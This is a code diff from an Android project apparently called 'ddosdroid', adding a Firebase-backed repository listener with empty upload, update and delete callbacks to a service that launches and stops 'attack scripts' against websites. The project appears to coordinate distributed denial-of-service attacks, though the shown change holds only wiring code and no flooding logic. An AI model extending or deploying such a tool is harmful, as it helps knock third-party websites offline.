@@ -16,21 +16,32 @@ import gr.kalymnos.sk3m3l10.ddosdroid.R;
 import gr.kalymnos.sk3m3l10.ddosdroid.constants.Extras;
 import gr.kalymnos.sk3m3l10.ddosdroid.mvc_controllers.activities.AllAttackListsActivity;
 import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.job.AttackScript;
+import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.repository.AttackRepository;
+import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.repository.FirebaseRepository;
+import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attack;
 
 import static gr.kalymnos.sk3m3l10.ddosdroid.constants.ContentTypes.FETCH_ONLY_USER_JOINED_ATTACKS;
 import static gr.kalymnos.sk3m3l10.ddosdroid.constants.Extras.EXTRA_ATTACK;
 import static gr.kalymnos.sk3m3l10.ddosdroid.constants.Extras.EXTRA_WEBSITE;
 import static gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.connectivity.host_services.AttackLaunchService.ForegroundNotification.NOTIFICATION_ID;
 
-public class AttackLaunchService extends Service {
+public class AttackLaunchService extends Service implements AttackRepository.OnRepositoryChangeListener{
     private static final String TAG = "AttackLaunchService";
 
     private Map<String, AttackScript> scripts;
+    private AttackRepository repo;
 
     @Override
     public void onCreate() {
         super.onCreate();
         scripts = new HashMap<>();
+        initRepo();
+    }
+
+    private void initRepo() {
+        repo = new FirebaseRepository();
+        repo.setOnRepositoryChangeListener(this);
+        repo.startListenForChanges();
     }
 
     @Override
@@ -86,6 +97,21 @@ public class AttackLaunchService extends Service {
     private void stopAllScripts() {
         for (Map.Entry<String, AttackScript> entry : scripts.entrySet())
             entry.getValue().stopAttacking();
+    }
+
+    @Override
+    public void onAttackUpload(Attack attack) {
+
+    }
+
+    @Override
+    public void onAttackUpdate(Attack attack) {
+
+    }
+
+    @Override
+    public void onAttackDelete(Attack attack) {
+
     }
 
     public static class Action {
